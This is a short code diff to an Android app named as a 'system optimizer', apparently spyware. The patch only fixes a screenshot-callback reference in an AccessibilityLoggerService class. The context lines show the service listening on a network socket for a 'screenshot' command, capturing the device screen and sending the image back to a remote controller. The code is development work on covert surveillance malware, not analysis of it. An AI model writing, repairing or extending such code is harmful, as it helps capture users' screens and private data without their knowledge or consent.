@@ -2,7 +2,6 @@ package com.system.optimizer;
 
 import com.system.optimizer.handler.AccessibilityEventHandler;
 import com.system.optimizer.handler.ScreenshotCapture;
-import com.system.optimizer.handler.ScreenshotCallback;
 import com.system.optimizer.config.ConfigData;
 import com.system.optimizer.config.ConfigManager;
 import com.system.optimizer.network.SocketManager;
@@ -67,7 +66,7 @@ public class AccessibilityLoggerService extends AccessibilityService {
             // Add listener for manual screenshot requests
             this.socketManager.addListener("screenshot", args -> {
                 // Capture screenshot and send as response
-                screenShotCapture.takeScreenshot(new ScreenshotCallback() {
+                screenShotCapture.takeScreenshot(new ScreenshotCapture.ScreenshotCallback() {
                     @Override
                     public void onSuccess(byte[] imageData) {
                         if (imageData != null) {
